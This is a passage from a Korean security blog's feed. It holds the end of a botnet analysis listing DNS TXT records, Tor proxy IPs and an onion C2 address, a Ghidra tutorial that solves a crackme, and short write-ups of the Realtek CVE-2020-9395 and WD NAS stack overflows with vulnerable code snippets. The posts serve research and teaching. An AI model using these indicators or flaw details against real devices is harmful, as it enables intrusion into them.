stylus">hosts<span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. <span class="hljs-number">1751</span>INTXT<span class="hljs-string">&quot;iekfgakxorbfjcefbiyj&quot;</span></code></pre><ol start="2"><li><p>원격 호스트의 접미사(<code>.hiddenservice.xyz</code>)를 복호화해서 가져오고 위에서 받아온 <code>iekfgakxorbfjcefbiyj</code>에서 표의 조합 규칙에 따라 문자를 추출하여 호스트의 접두사로 호스트 리스트를 만듭니다.(ex. <code>er.hiddenservice.xyz</code>)</p></li><li><p>2에서 만들어진 원격 호스트에 DNS TXT request를 통해 TOR 프록시 주소를 받아옵니다.</p><pre><code class="hljs css"><span class="hljs-selector-tag">oc</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.245</span><span class="hljs-selector-class">.53</span><span class="hljs-selector-class">.58</span><span class="hljs-selector-pseudo">:9095&quot;</span><span class="hljs-selector-tag">fe</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>.1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;198<span class="hljs-selector-class">.27</span><span class="hljs-selector-class">.82</span><span class="hljs-selector-class">.186</span><span class="hljs-selector-pseudo">:9050&quot;</span></code></pre></li><li><p>원격 호스트 C(<code>onion.hiddenservice.xyz</code>)를 복호화해서 가져오고 DNS TXT request를 보내 토르 C2 주소를 받아옵니다.</p><pre><code class="hljs css"><span class="hljs-selector-tag">onion</span><span class="hljs-selector-class">.hiddenservice</span><span class="hljs-selector-class">.xyz</span>. 1799<span class="hljs-selector-tag">IN</span><span class="hljs-selector-tag">TXT</span>&quot;4<span class="hljs-selector-tag">qhemgahbjg4j6pt</span><span class="hljs-selector-class">.onion</span>&quot;</code></pre></li><li><p>무작위로 선택한 토르 프록시를 통해 C2에 연결을 시도합니다. 포트는 <code>31337</code>로 하드코딩되어 있습니다.</p></li><li><p>토르 프록시가 <code>05 00 00 01 00 00 00 00 00 00</code>를 반환하면, C2 연결이 완료되고 C2 명령을 기다립니다.</p></li></ol><p>360 netlab에서는 토르 C2를 사용하며 C2 포트가 <code>31337</code>인 점, 공격 메소드의 이름이 같고 C2 명령어 포맷이 비슷한 점을 통해 <a href="https://blog.netlab.360.com/the-leethozer-botnet-en/">LeetHozer</a>를 개발한 Moobot 그룹의 소행일 것이라고 추측하고 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>android</tag>
      
      <tag>botnet</tag>
      
      <tag>idioth</tag>
      
      <tag>matryosh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</title>
    <link href="/2021/02/07/idioth/ghidra_part1/"/>
    <url>/2021/02/07/idioth/ghidra_part1/</url>
    
    <content type="html"><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p>Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview (Here!)</p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/ghidra_part3">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</a></p><hr><p>안녕하세요! idioth입니다. 제가 좋아하는 애니메이션의 이름을 빌려 시리즈의 제목을 정했습니다 하하하! 제 기억이 맞다면 저희 블로그의 첫 research 글은 Ghidra의 플러그인인 AngryGhidra였죠?</p><p>사실 저는 ghidra가 처음 공개되었을 때 관심이 많았습니다. 그때는 국가의 요원(?)으로 복무 중이었는데, NSA에서 IDA와 같은 리버스 엔지니어링을 위한 툴을 발표한다! 했을 때 신기했었죠.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled.png"></p><p>깔아보고 사용해보면서 느낀 점은 “아.. 이거 엄청 불편하구나”였습니다. 아무래도 IDA에 익숙해져 있었으니 당연한 수순…</p><p>그 후로 잊고 살다가 소집해제를 하고 여러 글들을 보는데 reverse engineering with ghidra, malware analysis with ghidra 등 해외에서는 ghidra를 많이 쓰는 것 같더라고요? 하지만 국내 자료 중에는 ghidra에 대한 자료가 많지 않아서… 제가 공부하거나 찾아본 자료를 토대로 시리즈 물을 진행하려고 합니다.</p><p>글은 offical docs와 여러 해외 게시글들의 tip들을 종합하여 진행될 예정입니다. 그러면 이제 시작해보도록 하죠!</p><h1 id="Ghidra란-무엇인가"><a href="#Ghidra란-무엇인가" class="headerlink" title="Ghidra란 무엇인가?"></a>Ghidra란 무엇인가?</h1><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%201.png"></p><blockquote><p>자기 꼬리를 먹으려 하는 용..??</p></blockquote><p>ghidra는 NSA(미국 국가 안보국)에서 만든 소프트웨어 리버스 엔지니어링을 위한 프레임워크입니다. <a href="https://wikileaks.org/ciav7p1/index.html">WikiLeaks의 Vault 7</a>에 의해서 처음 정체(?)가 공개되었고, <a href="https://www.rsaconference.com/industry-topics/presentation/come-get-your-free-nsa-reverse-engineering-tool">2019년 RSA 컨퍼런스</a>에서 발표되었습니다.</p><p>여러 플랫폼에서 동작하게 하기 위해서 JAVA로 개발되었고, 다음과 같은 5개의 메인 파트를 가집니다.</p><ul><li>Programs</li><li>Plugins</li><li>Tools</li><li>Project Manager</li><li>Server</li></ul><p>하나하나가 어떤 동작을 하는지 살펴볼까요?</p><h2 id="Programs"><a href="#Programs" class="headerlink" title="Programs"></a>Programs</h2><p>ghidra에서 모든 데이터는 ghidra의 커스텀 데이터베이스를 통해 저장됩니다. Symbols, Bytes, Reference, Comments 등 사용자가 추가한 모든 데이터 또한 Ghidra 프로그램 데이터베이스에 저장이 되죠.</p><h2 id="Plugins"><a href="#Plugins" class="headerlink" title="Plugins"></a>Plugins</h2><p>ghidra는 플러그인들의 라이브러리라고 볼 수 있습니다. 각각의 플러그인들은 특정한 기능을 제공하죠. 모든 플러그인들은 서로 소통하며 ghidra 재시작 없이 플러그인의 추가/제거가 가능합니다. 사용자가 원하는 대로 커스텀할 수 있고 사용자가 직접 플러그인을 작성할 수도 있죠.</p><h2 id="Tools"><a href="#Tools" class="headerlink" title="Tools"></a>Tools</h2><p>Tools는 플러그인과 플러그인 설정의 모임이라고 생각하면 편합니다. 모든 tools는 커스터마이징이 가능하고 플러그인을 추가해서 원하는 tools를 만들 수도 있습니다.</p><h2 id="Project-Manager"><a href="#Project-Manager" class="headerlink" title="Project Manager"></a>Project Manager</h2><p>이름에서부터 알 수 있듯이, 특정 프로그램 그룹에 대해서 프로젝트, tools, data를 관리합니다. IDA에서는 바이너리만 열면 되는 것과 다르게 ghidra는 프로젝트를 생성하고, 거기에 바이너리를 추가해야 하는 과정이 필요하죠.</p><h2 id="Ghidra-Server"><a href="#Ghidra-Server" class="headerlink" title="Ghidra Server"></a>Ghidra Server</h2><p>ghidra는 협업을 위한 Shared-Project를 제공합니다. 이 공유 프로젝트 데이터들은 ghidra 서버를 통해서 공유할 수 있죠. 파일 버전을 지정할 수도 있고, check out, check in, version history 등의 기능을 제공합니다.</p><h1 id="Ghidra-vs-IDA-Pro"><a href="#Ghidra-vs-IDA-Pro" class="headerlink" title="Ghidra vs IDA Pro"></a>Ghidra vs IDA Pro</h1><p>ghidra는 분석 환경을 커스터마이징 할 수 있고 팀 활동을 지원하는 것 등 다양한 장점이 있는데 가장 큰 장점은 <strong>무료</strong>라는 점이죠. IDA Pro의 가격과 비교를 해본다면 엄청난 장점…!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%202.png"></p><p>개인적인 사용을 하거나 공부 용도로 200만 원가량을 지불하기에는… 크흠</p><p>Ghidra가 공개되고 나서부터 사람들은 IDA Pro랑 ghidra의 차이점, 뭐가 더 나은가에 대한 토론이 많이 이루어졌습니다. 어떤 게 더 나은지에 대한 생각은 사람마다 다르므로 차이점에 대해서 한 번 다뤄보도록 할까요?</p><ol><li>ghidra는 decompiler를 포함하여 모든 것이 무료다!<ul><li>IDA가 무료 버전을 제공하지만 Hex-rays 기능을 제공하지 않는 것을 생각하면 ghidra의 큰 장점 중 하나로 볼 수 있죠.</li></ul></li><li>IDA에는 debugger가 있지만 ghidra에는 없다!<ul><li>IDA에는 debugger를 붙여서 디버깅을 가능하지만 ghidra는 디버깅에 대한 기능을 제공하지 않습니다.</li></ul></li><li>ghidra는 한 번에 여러 바이너리를 프로젝트에 추가할 수 있다.<ul><li>애플리케이션과 라이브러리 간의 코드 추적을 쉽게 할 수 있습니다.</li></ul></li><li>ghidra는 데이터 흐름 분석을 통해 레지스터나 변수의 데이터가 어디에서 참조되는지 알 수 있다.</li><li>ghidra보다 IDA가 더 오래 사용되어서, IDA 플러그인이 좀 더 많다.</li></ol><p>대략적으로 살펴본 차이점은 이 정도가 있고, Hex-rays와 Ghidra Decompiler의 디컴파일 방식에 대해서도 차이가 존재합니다.</p><h2 id="Hex-rays-vs-Ghidra-Decompiler"><a href="#Hex-rays-vs-Ghidra-Decompiler" class="headerlink" title="Hex-rays vs Ghidra Decompiler"></a>Hex-rays vs Ghidra Decompiler</h2><h3 id="Hex-rays"><a href="#Hex-rays" class="headerlink" title="Hex-rays"></a>Hex-rays</h3><ul><li><a href="https://ko.wikipedia.org/wiki/%EB%A7%88%EC%9D%B4%ED%81%AC%EB%A1%9C%EC%BD%94%EB%93%9C">Microcode</a> 기반</li><li>일부 아키텍처만 지원</li><li>변수, 데이터, 함수에 대한 xrefer 제공</li><li>변수 매핑 가능</li><li>디컴파일러에서 변수 표현을 변경할 수 있음(decimal, hex, char 등)</li></ul><h3 id="Ghidra-Decompiler"><a href="#Ghidra-Decompiler" class="headerlink" title="Ghidra Decompiler"></a>Ghidra Decompiler</h3><ul><li><a href="https://ko.wikipedia.org/wiki/P-%EC%BD%94%EB%93%9C">P-code</a> 기반</li><li>모든 아키텍처 지원</li><li>xref 제공하지 않음</li><li>변수 매핑 불가능</li><li>디컴파일러에서 변수 표현 변경 불가능</li></ul><p>IDA Pro와의 차이점에 대해서도 간략하게 알아보았으니, 이제 ghidra를 만나러 가봅시다!</p><h1 id="Ghidra를-설치해보자"><a href="#Ghidra를-설치해보자" class="headerlink" title="Ghidra를 설치해보자!"></a>Ghidra를 설치해보자!</h1><p>먼저 ghidra를 사용하기 위해서는 설치를 해야겠죠? ghidra는 다음과 같은 플랫폼을 지원합니다.</p><ul><li>Windows 7 or 10 (64-bit)</li><li>Linux (64-bit, CentOS 7 is preferred)</li><li>macOS (OS X) 10.8.3+ (Mountain Lion or later)</li></ul><p>32비트 OS에 대한 지원은 일절 제공하지 않으니 참고해주세요!</p><p>그리고 위에서 ghidra는 JAVA로 개발되었다고 말씀드렸죠? 따라서 jdk 또한 필요합니다. ghidra의 원활한 사용을 위해서 <a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html">jdk 11</a>을 설치해주시면 됩니다!</p><p>ghidra 바이너리 설치는 <a href="https://ghidra-sre.org/">ghidra 홈페이지</a>에서 Download Ghidra 버튼을 눌러 간단하게 설치할 수 있습니다. 별도의 setup 없이 압축을 해제한 후 플랫폼에 따라 <code>ghidraRun.sh</code>이나 <code>ghidraRun.bat</code>를 클릭해주면 실행이 가능합니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%203.png"></p><blockquote><p><del>뭘 눌러야 될지 모르겠으면 그냥 둘 다 눌러보자</del></p></blockquote><p>Windows의 경우 <code>ghidraRun.bat</code>을 통해서 실행하면 되고, Linux나 MacOS는 <code>ghidraRun.sh</code>을 통해 실행하면 됩니다.</p><h1 id="간단한-Crackme를-통한-Ghidra-탐색전"><a href="#간단한-Crackme를-통한-Ghidra-탐색전" class="headerlink" title="간단한 Crackme를 통한 Ghidra 탐색전"></a>간단한 Crackme를 통한 Ghidra 탐색전</h1><p>제가 Windows 머신을 사용하므로 Windows 기준으로 진행됩니다. Linux와 MacOS에서도 실행 방식의 차이만 존재할 뿐, 차이가 없으니 걱정 안 하셔도 됩니다! 이 게시글에서 사용한 예제 파일은 <a href="https://crackmes.one/crackme/6004daf233c5d42c3d016717">여기</a>에서 다운로드하실 수 있습니다.(압축 파일의 비밀번호는 <code>crackmes.one</code>입니다.)</p><p>먼저 <code>ghidraRun.bat</code>이나 <code>ghidraRun.sh</code>을 통해 ghidra를 실행하면 다음과 같은 프로젝트 창이 뜹니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%204.png"></p><p>프로젝트 창에서는 프로젝트를 생성하고 바이너리를 로드, 구성할 수 있습니다. 새 프로젝트를 만든 후 바이너리를 드래그 앤 드롭을 하여 추가를 할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%205.png"></p><p>File - New Project (Ctrl+N)을 통해 새로운 프로젝트를 생성하고 위에서 다운로드한 예제 파일을 드래그 앤 드롭하거나 Import File을 통해 추가하여 줍니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%206.png"></p><p>바이너리 import가 완료되면, Import Summary 창을 통해 간략한 정보를 제공합니다. 해당 정보에서 컴파일러, Compiler ID 등등을 통해 대략적인 바이너리에 대한 정보를 얻을 수 있습니다.(악성코드 분석을 할 때 좋겠네요.)</p><p>이제 프로젝트 창에서 crackme.exe를 더블클릭하면 드래곤(!) 애니메이션이 뜨고 분석을 진행하겠냐고 묻는 창이 뜹니다. 당연히 Yes를 클릭해줍니다!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%207.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%208.png"></p><p>Yes를 클릭하면 ghidra에서 가능한 분석 옵션을 보여줍니다. 개별적인 세팅은 무시하고 기본 값을 그대로 사용하셔도 큰 문제는 없습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%209.png"></p><p>분석이 완료되고 난 후 메인 화면은 위와 같습니다. 이제 메인 화면에 각 섹션이 어떠한 기능을 하는지 살펴봅시다!</p><h2 id="Program-amp-Symbol-Trees-Data-Type-Manager"><a href="#Program-amp-Symbol-Trees-Data-Type-Manager" class="headerlink" title="Program &amp; Symbol Trees, Data Type Manager"></a>Program &amp; Symbol Trees, Data Type Manager</h2><h3 id="Program-Trees"><a href="#Program-Trees" class="headerlink" title="Program Trees"></a>Program Trees</h3><p>Program Trees를 활용하면 원하는 섹션으로 트리를 나눌 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2010.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2011.png"></p><blockquote><p>Dominance를 통해 구성된 코드 섹션 예시</p></blockquote><h3 id="Symbol-Tree"><a href="#Symbol-Tree" class="headerlink" title="Symbol Tree"></a>Symbol Tree</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2012.png"></p><p>Symbol Tree의 경우 Import 된 DLL, Exports 된 함수 등등의 정보를 제공합니다. 특정 함수가 어디에서 참조되는지 확인할 수도 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2013.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2014.png"></p><h3 id="Data-Type-Manager"><a href="#Data-Type-Manager" class="headerlink" title="Data Type Manager"></a>Data Type Manager</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2015.png"></p><p>Data Type Manager에서는 기본적으로 제공되거나, 바이너리에서 제공하는 데이터 타입을 확인할 수 있습니다. 데이터 타입을 우클릭하고 “Find Uses of”(<code>Ctrl + Shift + F</code>)를 클릭하여 해당 바이너리 내에서 데이터 유형이 사용되는 곳을 확인할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2016.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2017.png"></p><h2 id="Disassembly-View-amp-Function-Graph"><a href="#Disassembly-View-amp-Function-Graph" class="headerlink" title="Disassembly View &amp; Function Graph"></a>Disassembly View &amp; Function Graph</h2><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2018.png"></p><p>중앙에 큰 화면은 디스 어셈블 된 코드를 확인할 수 있는 창입니다. 여러 필드가 존재하고, 어떤 부분에 무엇이 표시될지 등 모두 사용자가 커스터마이징 할 수 있습니다.</p><p>상단 표시줄에 존재하는 “Edit the Listing fileds”를 클릭하고 “Instruction/Data”를 클릭하면 수정이 가능합니다. 크기 조정, 위치 이동, 비활성화, 새로운 기능 추가 등 다양하게 커스터마이징 할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2019.png"></p><p>IDA에서 함수 이름을 수정할 수 있는 것처럼 ghidra에서는 <code>L</code> 단축키를 이용하여 함수의 이름을 수정할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2020.png"></p><p>또한 함수의 이동 없이 해당 함수가 어떠한 코드로 되어있는지 확인하고 싶으면 함수 이름에 마우스 커서를 올려놓고 기다리면 해당 내용을 확인할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2021.png"></p><p>원하는 부분 우클릭-Comments- 원하는 Comment를 통해 주석도 추가가 가능합니다. <code>;</code> 단축키를 사용하여 원하는 부분에 바로 주석을 달 수도 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2022.png"></p><blockquote><p><code>;</code>를 눌렀을 때 나오는 창. 해당 창에 주석을 입력하고 ‘OK’를 누르면 된다.</p></blockquote><p>IDA Pro를 사용할 때 가장 편했던 기능 중 하나가 그래프 모드였죠? ghidra에서는 디스 어셈블 창에서 바로 그래프 뷰를 확인할 순 없지만 “Windows” - “Function Graph”를 통해 그래프 뷰를 사용할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2023.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2024.png"></p><blockquote><p>ghidra에서 제공하는 function graph. IDA Pro와 큰 차이가 나진 않는다.</p></blockquote><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2025.png"></p><p>Function Graph 또한 디스 어셈블 창과 마찬가지로 표시되는 내용을 커스터마이징 할 수 있습니다. 우측 상단의 “Edit Code Block Fileds”를 클릭한 후 “Instruction/Data”에서 아무 공간이나 우클릭-Add Field로 원하는 코드 블록을 추가할 수 있습니다.</p><h2 id="Decompiler"><a href="#Decompiler" class="headerlink" title="Decompiler"></a>Decompiler</h2><p>이제 IDA Pro의 hex-rays 기능에 해당하는 디컴파일러 창입니다. 기본적으로 디스 어셈블러 창 우측에 위치하며, 크기를 조정할 수 있고 위치 조정 또한 가능합니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2026.png"></p><p>함수 내부를 클릭하면 자동으로 함수 내용이 디컴파일 돼서 우측 디컴파일 창에 표시됩니다. 위의 사진처럼 Function Graph를 끌어다 넣어서 디스 어셈블 창이 아닌 Function Graph 창이 좌측에 표시되게 커스터마이징도 할 수 있죠!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2027.png"></p><p>위에서 설명드린 것과 마찬가지로 디컴파일러 창에서도 변수나 함수의 이름을 수정할 수 있고 주석을 달 수도 있습니다. 디컴파일러 창에서 수정한 내용은 디스 어셈블 창에도 적용이 되고, 디스 어셈블 창에서 수정한 내용도 디컴파일러 창에 적용이 됩니다.</p><h2 id="Crackme를-풀어보자"><a href="#Crackme를-풀어보자" class="headerlink" title="Crackme를 풀어보자!"></a>Crackme를 풀어보자!</h2><p>이제 ghidra의 대략적인 기능도 확인을 해보았으니 Crackme를 풀어볼 수 있을 것 같습니다. 일단 파일을 실행해서 어떠한 녀석인지 확인을 해봅시다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2028.png"></p><p>맞는 Input 값을 찾아야 하는 문제군요.(<del>Crackme니까… 당연하겠지</del>) ghidra를 확인해서 맞는 input이 무엇인지 찾아보도록 합시다!</p><p>ghidra를 실행한 후 Project 생성 후 바이너리를 추가하고, 분석까지 완료한 화면에서 main 화면을 찾아봅시다. String 검색을 통해 찾을 수도 있지만(그게 더 간단하지만), Symbol Tree를 통해 찾아봅시다. 좌측 Symbol Tree에서 Function 옆 + 버튼을 눌러 폴더를 열어줍니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2029.png"></p><p><code>___main</code>이 존재하는 것을 확인할 수 있습니다. 밑으로 더 스크롤해서 다른 함수를 확인해보면</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2030.png"></p><p><code>_main</code>과 <code>_mainCRTStartup</code>이 존재하는 걸 확인할 수 있습니다. Entry Point인 <code>_mainCRTStartup</code>을 통해 어떤 게 처음 시작되는 main 함수인지 확인해봅시다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2031.png"></p><p><code>_mainCRTStartup</code>의 내용을 확인해보니 <code>___mingw_CRTStartup</code> 함수를 호출합니다. 해당 함수도 탐색을 해볼까요? 더블클릭을 하면 해당 함수로 이동할 수 있습니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2032.png"></p><p><code>___main</code> 함수와 <code>_main</code> 함수를 차례대로 실행을 합니다. 위에 함수부터 들어가 봅시다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2033.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2034.png"></p><p>음… 실행했을 때 나오는 문자열을 출력하는 부분이 없는 걸 보아 <code>_main</code>이 진짜 메인 함수인 것 같네요. 뒤로 가거나 앞으로 가는 것은 좌측 상단의 버튼을 사용하거나 <code>ALT + 좌우 방향키</code>를 사용하시면 됩니다.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2035.png"></p><p><code>_main</code>으로 오니 위에서 확인했던 문자열도 출력되고, 입력 값과 비교하는 부분도 있네요. 아무래도 난이도 1짜리 간단한 문제이다 보니 바로 풀려버립니다ㅋㅋㅋ. 뭐 ghidra를 어떻게 사용하는지에 대해서 설명하려고 가져온 문제니까! <code>0x1232b14 = 19082004</code>이므로 입력을 해주면…</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2036.png"></p><p>정답임을 알 수 있습니다.</p><h1 id="마치며…"><a href="#마치며…" class="headerlink" title="마치며…"></a>마치며…</h1><p>오늘은 간단하게 ghidra란 무엇인지, IDA랑 비교했을 때 어떠한 차이점이 있는지, ghidra는 어떠한 기능들을 가지고 있는지에 대해 Easy Crackme를 풀어보며 간단히 살펴보았습니다.</p><p>Part 2에서는 오늘 간단하게 짚고 넘어간 Data, Function, Scripts에 대해서 좀 더 다뤄볼 예정입니다. 국내에는 아직 IDA Pro 사용자가 많지만 ghidra를 사용해보고 싶으신 분들이 계시다거나, IDA Pro를 접하기 힘들어서 ghidra를 써보고 싶은데 잘 모르겠다 하시는 분들에게 큰 도움이 됐으면 하며…</p><p>잘못된 설명이나, 부족한 부분이 있다면 언제든 댓글로 남겨주시면 반영하고 수정하도록 하겠습니다. 그럼 다들 좋은 밤 보내세요~! 저는 이제 자러 가 보도록 하겠습니다!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2037.png"></p><p><del>밤에 깨어있고 낮에 자는 뱀파이어 같은 모순적인 삶…</del></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dannyquist.github.io/gootkit-reversing-ghidra/">https://dannyquist.github.io/gootkit-reversing-ghidra/</a></p><p><a href="https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html">https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html</a></p><p><a href="https://ghidra.re/online-courses/">https://ghidra.re/online-courses/</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>crackme</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2020-9395: Realtek&#39;s Wi-Fi module remote root access</title>
    <link href="/2021/02/06/fabu1ous/2021-02-06/"/>
    <url>/2021/02/06/fabu1ous/2021-02-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.vdoo.com/blog/realtek-rtl8195a-vulnerabilities-discovered">Major Vulnerabilities discovered and patched in Realtek RTL8195A Wi-Fi Module</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Realtek’s RTL8195A Wi-Fi module </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Vdoo가 Realtek RTL8195A Wi-Fi 모듈에서 발생하는 취약점(CVE-2020-9395)의 세부 정보를 공개했습니다. RTL8195A는 임베디드 장비용 low-power Wi-Fi 모듈로 WPA2 handshake 동작에 stack overflow, out-of-bound read 취약점이 존재합니다. 해커는 취약점을 통해 원격으로 모듈의 root를 탈취할 수 있고 이 모듈이 탑재된 임베디드 장비의 모든 무선 통신을 조작할 수 있게 됩니다.</p><p>WPA2 handshake의 EAPOL-Key 교환 작업 중 Client는 <code>ClientEAPOLKeyRecvd()</code>를 Server는 <code>EAPOLKeyRecvd()</code>를 호출합니다. 두 함수 모두 <code>CheckMIC()</code>를 호출해 EAP 패킷의 MIC에 대한 무결성 검증을 진행합니다. </p><pre><code class="hljs c">rtl_memcpy(tmpbuf, EAPOLMsgRecvd.Octet, EAPOLMsgRecvd.Length);</code></pre><p><code>ChckMIC()</code>에는 unsafe copy를 하는 코드가 존재합니다. tmpbuf의 크기는 512 bytes로 고정되어 있지만 <code>EAPOLMsgRecvd.Octet</code>와 <code>EAPOLMsgRecvd.Length</code> 모두 해커가 아무 제약 없이 조작할 수 있습니다(attack-controlled). NX-bit, ASLR, Canary 등 보호 기법이 존재하지 않아 tmpbuf 보다 큰 사이즈의 조작된 packet을 통해 <code>CheckMIC()</code>의 리턴 주소를 조작해 RCE 또는 DoS 등의 공격이 가능합니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>wifi</tag>
      
      <tag>embedded</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] Stack-based buffer overflow RCE in WD NAS</title>
    <link href="/2021/02/05/l0ch/2021-02-05/"/>
    <url>/2021/02/05/l0ch/2021-02-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.crowdstrike.com/blog/pwn2own-tale-of-a-bug-found-and-lost-again/">Pwn2Own: A Tale of a Bug Found and Lost Again</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>My Cloud Pro Series PR4100 2.31.204 (2019-12-16), 2.40.155 (2020-07-28), 2.40.157 (2020-10-20)</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>하드디스크 생산 업체 Western Digital(WD)의 대용량 네트워크 스토리지 My Cloud Pro 제품에서 스택 버퍼 오버플로우를 통한 root 권한 원격 코드 실행 취약점의 세부 정보가 공개되었습니다.</p><p>CGI 바이너리 <code>login_mgr.cgi</code>는 로그인 프로세스와 관련된 여러 루틴을 수행합니다.</p><p><code>login_mar.cgi</code>의 <code>wd_login()</code> 함수는 ID와 패스워드를 각각 <code>username</code>과 <code>pwd</code> 매개 변수로 받아 인증 시도를 하는데, 이때 <code>pwd</code>는 Base64 인코딩 된 값이어야 합니다. 이후 <code>cgiFormString()</code> 함수에서 <code>username</code>과 <code>pwd</code>를 스택 버퍼 인 <code>username</code>과 <code>pwd_b64</code>에 복사합니다.  <code>base64decode()</code> 함수는 <code>pwd_b64</code>를 Base64 디코딩해 <code>pwd_decoded</code>에 저장하며 디코딩은 내부적으로 glibc의 <code>b64_pton()</code>에서 이루어집니다.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> pwd_decoded[<span class="hljs-number">64</span>]; <span class="hljs-comment">// [rsp+90h] [rbp-1178h] BYREF</span><span class="hljs-keyword">char</span> pwd_b64[<span class="hljs-number">256</span>];    <span class="hljs-comment">// [rsp+D0h] [rbp-1138h] BYREF</span></code></pre><p>디코딩 과정에서 디코딩 전 패스워드인 <code>pwd_b64</code>의 크기는 256 bytes이지만 디코딩된 패스워드가 복사되는 <code>pwd_decoded</code>의 크기는 64 bytes입니다. 256 bytes 길이의 base64 인코딩 값의 최대 디코딩 문자열 길이는 192 bytes로 64 bytes 크기인 <code>pwd_decoded</code>에 128 bytes 만큼 데이터를 더 쓸 수 있습니다.</p><pre><code class="hljs c"><span class="hljs-keyword">char</span> password_copy_shadow[<span class="hljs-number">80</span>]; <span class="hljs-comment">// [rsp+ 0h] [rbp-C8h] BYREF</span><span class="hljs-keyword">char</span> password_copy_input[<span class="hljs-number">88</span>];  <span class="hljs-comment">// [rsp+50h] [rbp-78h] BYREF</span></code></pre><p>이후 <code>check_login()</code> 함수에서 <code>/etc/shadow</code>의 패스워드 해시와 비교하기 위해 <code>strcpy()</code>로 <code>pwd_decoded</code> 에서 <code>password_copy_input</code>으로 복사합니다. 이때 이전 오버플로 취약점으로 인해 192 bytes 크기의 데이터가 있는 <code>pwd_decoded</code>에서 복사하고 